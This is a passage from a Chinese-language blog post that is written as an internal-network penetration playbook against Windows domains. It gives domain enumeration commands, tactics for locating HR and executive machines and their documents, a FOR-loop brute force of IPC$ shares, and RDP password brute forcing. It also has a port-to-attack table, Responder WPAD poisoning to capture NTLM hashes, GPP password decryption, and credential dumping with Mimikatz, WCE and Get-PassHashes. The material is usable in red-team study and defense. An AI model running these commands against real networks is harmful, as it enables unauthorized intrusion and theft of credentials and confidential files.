net group <span class="s2">"domain admins"</span> /domain
//查看域内管理员.

net user /domain
//查看域内的用户名.

net group <span class="s2">"domain computers"</span> /domain
//查看域内所有机器名.

net <span class="nb">time</span> /domain
//查看域时间及域服务器的名字

Nslookup <span class="nt">-type</span><span class="o">=</span>SRV _ldap._tcp.
//查询DNS

netstat
//查看连接信息.

net group <span class="s2">"Domain Controllers"</span> /domain
//查找域控

nbtstat
//由IP地址得到机器名
</code></pre></div></div>

<p>上面我们已经得到了一些内网信息,现在我们就需要好好分析一下了.</p>

<p>1、分析出内部网络是怎么划分的.是按照部门划分的网络段,还是按照楼层,还是按照地区划分.</p>

<p>2、分析出内部网络机器名的命名规则.特别是个人机,这对选取有价值目标很重要.不过有些内网是采用的无规则命名法,这也是正常的.但是一般还是有规律的.</p>

<p>3、分析出内部网络重要人的电脑名.这些重要人物一般在对外网站上都会有一些介绍的.再根据机器命名规则,就可以大概分析得出这些机器.这里要注意,有些人有多个电脑哦.还有些人用的是笔记本的.</p>

<p>4、分析域结构,有些内部网络是多层域结构,而且还是多级域结构,这样,我们就需要先分析出,现在这电脑所在域是几级子域,这个子域域控以及根域域控是哪些,还有其他域的域控是哪些.一般域控命名都有DC字样.</p>

<h3 id="文件定位">文件定位</h3>

<p>服务器定位总结出文件定位的大致思路：</p>

<ul>
  <li>定位人力资源主管个人机</li>
  <li>定位人力资源相关文档存放位置</li>
  <li>从人力资源文档中找相关人</li>
  <li>定位相关人的机器</li>
  <li>监视相关人工作时存放文档的位置</li>
  <li>列出存放文档服务器的目录</li>
</ul>

<p>文件定位需要注意的点：</p>
<ul>
  <li>产品名称</li>
  <li>内部名称</li>
  <li>项目负责人</li>
  <li>项目团队</li>
  <li>生产部（分公司，工厂，代工厂）</li>
</ul>

<p>经验：</p>
<ul>
  <li>FTP</li>
  <li>SMB</li>
  <li>DC\NETLOGON\</li>
  <li>产品管理系统（仓库管理系统）</li>
  <li>各种数据库</li>
  <li>其他服务器（分公司，工厂，代工厂）</li>
</ul>

<blockquote>
  <p>定位文件服务器请参考上一节定位服务器（机器），定位到文件服务器和某个人，对于文件定位来说应该会事半功倍。这里就不过多叙述了。</p>
</blockquote>

<h3 id="管理员定位">管理员定位</h3>

<p><strong>0x01工具：</strong></p>

<ul>
  <li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">psloggedon.exe</a>:通过检验注册表里HKEY_USERS的key值来查询谁登陆过机器，同样也调用到了NetSessionEnum API。某些功能需要管理员权限</li>
  <li><a href="http://www.joeware.net/freetools/index.htm">netsess.exe</a>:调用NetSessionEnum API，并且在远程主机上无需管理员权限。</li>
  <li><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">PVEFindADUser.exe</a>:用于枚举域用户以及登陆过特定系统的用户，需要管理员权限</li>
  <li><a href="https://github.com/mubix/netview">netview.exe</a>:使用WinAPI枚举系统，利用NetSessionEnum来找寻登陆sessions,利用NetShareEnum来找寻共享 , 利用 NetWkstaUserEnum 来枚举登陆的用户。它也能查询共享入口和有价值用户，还能使用延迟和抖动。绝大部分功能不需要管理员权限。</li>
  <li><a href="https://github.com/fdiskyou/hunter">hunter</a>:hunter是一款利用 Windows API 调用来枚举跳板机上的用户登录信息的工具</li>
  <li><a href="">Nmap的NSE脚本</a>：如果你有域账户或者本地账户，你可以使用Nmap的smb-enum-sessions.nse 引擎来获取远程机器的登录session，并且不需要管理员权限
    <ul>
      <li><code class="highlighter-rouge">smb-enum-domains.nse</code>对域控制器进行信息收集扫描，可以获取主机信息，用户，密码策略可以用的用户等</li>
      <li><code class="highlighter-rouge">smb-enum-users.nse</code>在进行域渗透的时候，有了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息的时候，可以借助这个脚本对域控制器进行扫描</li>
      <li><code class="highlighter-rouge">smb-enum-shares.nse</code>遍历远程主机的共享目录</li>
      <li><code class="highlighter-rouge">smb-enum-processes.nse</code>通过smb对主机的系统进程进行遍历，通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙以及杀毒软件。</li>
      <li><code class="highlighter-rouge">smb-enum-sessions.nse</code>通过smb获取域内主机的用户登录session，查看当前是否有用户登录，对于我们抓取用户hash以及避免同时登陆被用户发现。</li>
      <li><code class="highlighter-rouge">smb-os-discovery.nse</code>通过smb协议来收集目标主机的操作系统，计算机名，域名，全称域名，域林名称，NetBIOS机器名，NetBIOS域名，工作组，系统时间。</li>
    </ul>
  </li>
</ul>

<p><strong>0x02 Active Directory:</strong></p>

<p>通过AD信息来识别一些连接到服务器的用户：</p>
<ul>
  <li>http://www.harmj0y.net/blog/redteaming/trusts-you-might-have-missed/</li>
  <li>http://www.sixdub.net/2014/11/offensive-event-parsing-bringing-home-trophies/</li>
</ul>

<p><strong>0x03PowerShell：</strong></p>

<p>针对windows机器，可以考虑用wmi脚本和powershell脚本进行扫描，低频扫描可以很容易的绕过IDS的规则。PowerShell有很多方法Windows Api并且绕过白名单:</p>
<ul>
  <li>http://www.mottoin.com/89568.html</li>
</ul>

<p><strong>0x04 查找域管理进程：</strong></p>

<ul>
  <li>https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/</li>
</ul>

<hr />

<h2 id="进攻">进攻</h2>

<p>1、内网WEB渗透.内网的WEB,一般情况下是比较容易搞下的,毕竟不像放在公共网络上.有那么大的风险,相对的,管理也就松散一些了.而且,内网的一些服务器是做测试用的,至于哪些服务器是做什么用的,可以通过判断机器名来分析,机器名的命名大多是有规律的.这跟国家风俗有一些习惯,但是也有公司采用无规则命令法,这就很蛋疼.</p>

<p>2、内网SQL.内网的SQL一般是特别有用的.因为一般域结构的内网,都会比较看重权限.那么一般WEB上都会有登陆验证,这些验证SQL就特别有用了，拿下来,对应人跟机器,后面,你懂的.</p>

<p>3、抓HASH，弱口令匹配内网机器。一般内网的机器弱口令还是存在的。分析一些内部的常用密码，然后再自己组合一些密码，再用工具去匹配，一般还是有收获的。以前有些HASH还破解不出来，还得依靠HASH注入这些技术，现在有了新东西mimikatz，可以抓取内存的密码，还是直接明文的。容易多了。</p>

<p>4、内网进攻常用命令整理：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   net use <span class="se">\\</span>IP<span class="se">\i</span>pc<span class="nv">$ </span>password /user:username@domain（IPC对方）

   net use <span class="se">\\</span>ip<span class="se">\i</span>pc<span class="nv">$ </span><span class="s2">"pwd"</span>  /user:ip<span class="se">\u</span>sername@domain （解决IPC时遇到权限问题）

   net <span class="nb">time</span> <span class="se">\\</span>IP

   at  <span class="se">\\</span>IP
</code></pre></div></div>

<h3 id="取得合法身份前的攻击">取得合法身份前的攻击</h3>

<h4 id="认证">认证</h4>

<p>攻击Windows常攻击Windows的文件和打印共享服务，这项服务运行在SMB(服务器消息块)上，尝试远程共享加载：试着连接一个共享卷(比如IPC$或C$共享卷)：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use <span class="se">\\</span>192.168.200.21<span class="se">\I</span>PC<span class="nv">$ </span><span class="k">*</span> <span class="se">\u</span>:用户名
</code></pre></div></div>

<blockquote>
  <p>*表示手动输入密码</p>
</blockquote>

<p>也可以使用FOR语句来爆破密码，将<code class="highlighter-rouge">tokent.txt</code>的第一个字串赋值给<code class="highlighter-rouge">%i</code>（密码），将第二个字串赋值给<code class="highlighter-rouge">%j</code>(用户名)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FOR /F <span class="s2">"tokens=1,2*"</span> %i <span class="k">in</span> <span class="o">(</span>token.txt<span class="o">)</span> <span class="k">do </span>net use <span class="se">\\</span>192.168.200.21<span class="se">\I</span>PC<span class="nv">$ </span>%i /u:%j
</code></pre></div></div>

<p><img src="/img/hack/%E5%86%85%E7%BD%91/net_use_for.png" alt="" /></p>

<p>也可以使用以下工具进行口令猜测：</p>
<ul>
  <li><a href="https://packetstormsecurity.com/files/download/31882/enum.tar.gz">enum</a></li>
  <li><a href="http://www.hoobie.net/brutus/index.html">Brutus</a></li>
  <li><a href="https://github.com/vanhauser-thc/thc-hydra">THC Hydra</a></li>
  <li><a href="http://foofus.net/?page-id=51">Medusa</a></li>
</ul>

<p>用enum爆破：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\w</span>in2k8<span class="se">\D</span>esktop&gt;enum.exe <span class="nt">-D</span> <span class="nt">-u</span> Administrator <span class="nt">-f</span> credentials.txt 192.168.200.21
</code></pre></div></div>

<p>有时候也可以直接爆破远程桌面服务。</p>

<p>用<a href="http://www.hammerofgod.com/resources/downloads/tsgrinder-2.03.zip">TSGrinder</a>爆破RDP：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\w</span>in2k8<span class="se">\D</span>esktop<span class="se">\t</span>sgrinder-2.03&gt;echo Admin 1&gt;a  &amp; tsgrinder.exe <span class="nt">-w</span> a <span class="nt">-u</span> Administrator <span class="nt">-n</span> 1 192.168.200.21 1&gt;out
</code></pre></div></div>

<blockquote>
  <p>该工具主要针对于XP和2003，当用在win7的时候，需要将注册表<code class="highlighter-rouge">HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting\Dont Show UI</code>设为1.</p>
</blockquote>

<p>kali下的rdesktop爆破：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rdesktop <span class="nt">-u</span> Administrator <span class="nt">-p</span> token.txt 10.10.10.150
</code></pre></div></div>

<h4 id="扫描">扫描</h4>

<p><strong>0x01 nbtscan:</strong>
使用<a href="http://www.unixwiz.net/tools/nbtscan.html">nbtscan</a>扫描：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nbtstat <span class="nt">-m</span> 192.168.200.21

nbtscan 192.168.200.0/24

</code></pre></div></div>

<p><img src="/img/hack/%E5%86%85%E7%BD%91/nbtscan.png" alt="" /></p>

<blockquote>
  <p>SHARING 表示开放来共享， DC 表示可能是域控，或者是辅助域控U=user猜测此计算机登陆名 IIS 表示运行来web80 EXCHANGE Microsoft Exchange服务 NOTES Lotus Notes服务</p>
</blockquote>

<p><strong>0x02:WinScanX:</strong></p>

<p>WinScanX 需要登录账号能够获取目标很详细的内容。其中还有snmp获取,windows密码猜解(但是容易被杀,nishang中也实现出一个类似的信息获取/Gather/Get-Information.ps1)</p>

<h5 id="端口">端口</h5>

<table>
  <thead>
    <tr>
      <th>端口号</th>
      <th>端口说明</th>
      <th>攻击技巧</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>21/22/69</td>
      <td>ftp / tftp：文件传输协议</td>
      <td>爆破\嗅探\溢出\后门</td>
    </tr>
    <tr>
      <td>22</td>
      <td>ssh：远程连接</td>
      <td>爆破OpenSSH; 28个退格</td>
    </tr>
    <tr>
      <td>23</td>
      <td>telnet：远程连接</td>
      <td>爆破\嗅探</td>
    </tr>
    <tr>
      <td>25</td>
      <td>smtp：邮件服务</td>
      <td>邮件伪造</td>
    </tr>
    <tr>
      <td>53</td>
      <td>DNS：域名解析系统</td>
      <td>DNS域名传输\ DNS劫持\ DNS缓存投毒\ DNS欺骗\利用DNS隧道技术刺透防火墙</td>
    </tr>
    <tr>
      <td>67/68</td>
      <td>dhcp</td>
      <td>劫持\欺骗</td>
    </tr>
    <tr>
      <td>110</td>
      <td>pop3</td>
      <td>爆破</td>
    </tr>
    <tr>
      <td>139</td>
      <td>samba</td>
      <td>爆破\未授权访问\远程代码执行</td>
    </tr>
    <tr>
      <td>143</td>
      <td>imap</td>
      <td>爆破</td>
    </tr>
    <tr>
      <td>161</td>
      <td>snmp</td>
      <td>爆破</td>
    </tr>
    <tr>
      <td>389</td>
      <td>ldap</td>
      <td>注入攻击\未授权访问</td>
    </tr>
    <tr>
      <td>512/513/514</td>
      <td>linux r</td>
      <td>直接使用rlogin</td>
    </tr>
    <tr>
      <td>873</td>
      <td>rsync</td>
      <td>未授权访问</td>
    </tr>
    <tr>
      <td>1080</td>
      <td>socket</td>
      <td>爆破：进行内网渗透</td>
    </tr>
    <tr>
      <td>1352</td>
      <td>lotus</td>
      <td>爆破：弱口令\信息泄漏：源代码</td>
    </tr>
    <tr>
      <td>1433</td>
      <td>mssql</td>
      <td>爆破：使用系统用户登录\注入攻击</td>
    </tr>
    <tr>
      <td>1521</td>
      <td>oracle</td>
      <td>爆破：TNS \注入攻击</td>
    </tr>
    <tr>
      <td>2049</td>
      <td>nfs</td>
      <td>配置不当</td>
    </tr>
    <tr>
      <td>2181</td>
      <td>zookeeper</td>
      <td>未授权访问</td>
    </tr>
    <tr>
      <td>3306</td>
      <td>mysql</td>
      <td>爆破\拒绝服务\注入</td>
    </tr>
    <tr>
      <td>3389</td>
      <td>rdp</td>
      <td>爆破\ Shift后门</td>
    </tr>
    <tr>
      <td>4848</td>
      <td>glassfish</td>
      <td>爆破：控制台弱口令\认证绕过</td>
    </tr>
    <tr>
      <td>5000</td>
      <td>sybase / DB2</td>
      <td>爆破\注入</td>
    </tr>
    <tr>
      <td>5432</td>
      <td>postgresql</td>
      <td>缓冲区溢出\注入攻击\爆破：弱口令</td>
    </tr>
    <tr>
      <td>5632</td>
      <td>pcanywhere</td>
      <td>拒绝服务\代码执行</td>
    </tr>
    <tr>
      <td>5900</td>
      <td>vnc</td>
      <td>爆破：弱口令\认证绕过</td>
    </tr>
    <tr>
      <td>6379</td>
      <td>redis</td>
      <td>未授权访问\爆破：弱口令</td>
    </tr>
    <tr>
      <td>7001</td>
      <td>weblogic</td>
      <td>Java反序列化\控制台弱口令\控制台部署webshel​​l</td>
    </tr>
    <tr>
      <td>80/443/8080</td>
      <td>web</td>
      <td>常见web攻击\控制台爆破\对应服务器版本漏洞</td>
    </tr>
    <tr>
      <td>8069</td>
      <td>zabbix</td>
      <td>远程命令执行</td>
    </tr>
    <tr>
      <td>9090</td>
      <td>websphere控制台</td>
      <td>爆破：控制台弱口令\ Java反序列</td>
    </tr>
    <tr>
      <td>9200/9300</td>
      <td>elasticsearch</td>
      <td>远程代码执行</td>
    </tr>
    <tr>
      <td>11211</td>
      <td>memcacache</td>
      <td>未授权访问</td>
    </tr>
    <tr>
      <td>27017</td>
      <td>mongodb</td>
      <td>爆破\未授权访问</td>
    </tr>
  </tbody>
</table>

<h3 id="凭据">凭据</h3>

<p>没有登录凭据的时候，可以破解对方的WPAv2个人Wifi密码，或者从某台不受域管理的主机下手。</p>

<h4 id="responder">Responder</h4>

<p><a href="https://github.com/SpiderLabs/Responder">Responder</a>可以在一无所知的情况下取得最初的登陆凭据，其能率先监听、响应LLMNR协议(本地链路多播名称解析协议)和NBT-NS协议，其也可以利用<a href="https://blogs.technet.microsoft.com/srd/2012/11/13/ms12-074-addressing-a-vulnerability-in-wpads-pac-file-handling/">WPAD（Web Proxy Auto-Discovery）漏洞</a>（也就是浏览器设置为自动检测的设置，受害者会从网络获取配置文件）</p>

<p><img src="/img/hack/%E5%86%85%E7%BD%91/IE_Auto_detect_settings.png" alt="" /></p>

<p>该情况，与受害人主机处于同一个网络里的攻击人员，能够回复受害主机发出的名称解析请求，并注入自己的PAC文件，代理所有WEB流量。这种攻击方式能强制浏览器用户对攻击人员的SMB服务器进行验证。若受害者在我们的SMB服务器上进行身份验证，就能够获取这个主机的NTLM算法的哈希响应值，而受害者没有任何察觉，若该用户进行过域验证，那么它就会使用缓存中的登陆凭据对服务器进行验证。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python Responder.py <span class="nt">-i</span> 10.10.10.149 <span class="nt">-I</span> eth0 <span class="nt">-b</span> Off <span class="nt">-r</span> Off <span class="nt">-w</span> On
</code></pre></div></div>

<blockquote>
  <p>收到WPAD请求的时候发送恶意响应。</p>
</blockquote>

<h4 id="组策略首选项">组策略首选项</h4>

<p>GPP的全名是组策略首选项，是为了满足管理活动目录的需要存在的，GPP的操作对象是组策略对象（GPO），在所有计算机上更新密码或者指定新的管理员，就会使用这个机制更新。GPP发布的账号信息全部存储在<code class="highlighter-rouge">\\[Domain Controller]\SYSVOL\[Ddomain]\Policies</code>中。可以在该文件夹找到一个名为<code class="highlighter-rouge">Groups.xml</code>的文件。若能找到该文件，就可以在<code class="highlighter-rouge">Groups.xml</code>文件找到<code class="highlighter-rouge">cpassword</code>的哈希值。然后使用<a href="https://pastebin.com/TE3fvhEh">gpprefdecrypt.py</a>解密GPP中本地管理员账户的密码，或者使用msf中的<code class="highlighter-rouge">post/windows/gather/credentials/gpp</code>获取本地管理员账号。</p>

<h4 id="抓hash">抓HASH</h4>

<h5 id="get-passhashesps1">Get-PassHashes.ps1</h5>

<p><img src="https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1" alt="Get-PassHashes.ps1" />脚本在Administrator的权限下，可以dump出密码哈希值。这个脚本来自于msf中powerdump，但做出了修改，使得我们不再需要System权限就可以dump了。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\T</span>im<span class="se">\D</span>esktop<span class="se">\n</span>ishang-master&gt; Set-ExecutionPolicy remotesigned

PS C:<span class="se">\U</span>sers<span class="se">\T</span>im<span class="se">\D</span>esktop<span class="se">\n</span>ishang-master&gt; Import-Module .<span class="se">\n</span>ishang.psm1

PS C:<span class="se">\U</span>sers<span class="se">\T</span>im<span class="se">\D</span>esktop<span class="se">\n</span>ishang-master&gt; Get-PassHashes
</code></pre></div></div>

<h5 id="wce">WCE</h5>

<p><a href="http://www.ampliasecurity.com/research/windows-credentials-editor/">WCE</a>能够列出Windows中的登陆会话、增加、修改、查询和删除相关凭据(LM/NT哈希值,Kerberos票据，明文密码)。</p>

<p><code class="highlighter-rouge">wce -l</code>列出已登陆的会话和NTLM凭据，<code class="highlighter-rouge">wce -w</code>用于复制存储在认证摘要信息中的明文密码。只要有管理员权限就可以抓取密码，无需破解hash值。</p>

<p><img src="/img/tools/domain/hash/wce.png" alt="" /></p>

<h5 id="minikatz">Minikatz</h5>

<p><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>可从LSASS中恢复明文密码。</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
</code></pre></div></div>

<p><img src="/img/tools/domain/hash/mimikatz.png" alt="" /></p>

<hr />

<h1 id="refer">Refer</h1>

<ul>
  <li><a href="http://www.mottoin.com/92978.html">内网渗透测试定位技术总结</a>:http://www.mottoin.com/92978.html</li>
  <li><a href="http://www.mottoin.com/85401.html">nmap加载nse脚本在内网渗透中的使用－上</a>:http://www.mottoin.com/85401.html</li>
  <li><a href="http://www.mottoin.com/85413.html">nmap加载nse脚本在内网渗透中的使用－下</a>:http://www.mottoin.com/85413.html</li>
  <li><a href="https://raw.githubusercontent.com/l3m0n/pentest_study/master/README.md">pentest_study</a>:https://raw.githubusercontent.com/l3m0n/pentest_study/master/README.md</li>
  <li><a href=""></a>:</li>
</ul>

        </article>
        <hr>

        
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                        
                        <h2 id="similar_posts">Similar Posts</h2>
                        <ul>
                        
                        <li class="relatedPost">
                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
                            
                            </a>
                        </li>
                        
                        
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
                            
                            </a>
                        </li>
                        
                        
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/12/19/build-domain/">域环境
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/27/reverse-shell/">获取shell
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
                    
                
            
        
        
            </ul>
        

        <div class="post-recent">
    <div class="pre">
        
        <p><strong>上一篇</strong> <a href="/2017/12/27/open-RDP/">开启RDP</a></p>
        
    </div>
    <div class="nex">

        
        <p><strong>下一篇</strong> <a href="/2018/01/04/command-and-control-images/">command-and-control-images</a></p>
        
    </div>
</div>


        <h2 id="comments">Comments</h2>
        


<div id="disqus_thread"></div>
<script>
    /**
     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */

    var disqus_config = function() {
        this.page.url = 'http://localhost:4000/2017/12/30/exploit-domain/'; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'http://localhost:4000/2017/12/30/exploit-domain/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };

    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document,
            s = d.createElement('script');

        s.src = '//http-b404-xyz.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">

            <!-- Content -->
            <div class="side content">
                <div>
                    Content
                </div>
                <ul id="content-side" class="content-ul">
                    
                    <li><a href="#similar_posts">Similar Posts</a></li>
                    
                    <li><a href="#comments">Comments</a></li>
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <!-- <div class="side">bbbb</div> -->
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<script src="/js/pageContent.js " charset="utf-8"></script>


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
             The quieter you become, the more you can hear. 
        </p>

        <br>
        <p class="contact">
             
            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
            <a href="mailto:jirairya404@gmail.com" title="email"><i class="fa fa-envelope-o" aria-hidden="true"></i></a>        
            
        </p>
        <!--
        <p>
            本站总访问量<span id="busuanzi_value_site_pv"></span>次，本站访客数<span id="busuanzi_value_site_uv"></span>人次，本文总阅读量<span id="busuanzi_value_page_pv"></span>次
        </p>
    -->
        <p class="power">
            <span>
                Site powered by <a href="https://jekyllrb.com/">Jekyll</a>
            </span>
        </p>
    </div>
</footer>
<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <div class="back-to-top">
    <a href="#top" data-scroll>
        <i class="fa fa-arrow-up" aria-hidden="true"></i>
    </a>
</div>

    <script src=" /js/main.js " charset="utf-8"></script>
    <script src=" /js/smooth-scroll.min.js " charset="utf-8"></script>
    <script type="text/javascript">
      smoothScroll.init({
        speed: 500, // Integer. How fast to complete the scroll in milliseconds
        easing: 'easeInOutCubic', // Easing pattern to use
        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
      });
    </script>
    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
  </body>

</html>
